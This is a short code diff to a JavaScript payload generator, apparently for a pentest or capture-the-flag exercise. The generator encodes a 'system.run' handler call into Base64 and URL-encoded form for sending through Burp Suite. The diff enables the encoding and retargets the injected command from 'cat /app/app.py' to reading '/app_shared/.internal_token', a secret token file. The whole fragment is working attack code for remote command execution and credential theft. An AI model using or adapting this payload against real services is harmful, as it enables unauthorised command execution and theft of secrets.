@@ -13,7 +13,7 @@ function generatePayload(handler, arg) {
   buf.set(a, 4 + h.length + 4);
   
   // Uint8Array -> Base64
-  // const base64 = btoa(String.fromCharCode(...buf));
+  const base64 = btoa(String.fromCharCode(...buf));
   
   // URL Encoded (Burp Suite 전송용)
   const urlEncoded = encodeURIComponent(base64);
@@ -23,4 +23,4 @@ function generatePayload(handler, arg) {
   return { base64, urlEncoded };
 }
 
-generatePayload("system.run", "cat /app/app.py");
+generatePayload("system.run", "cat /app_shared/.internal_token");
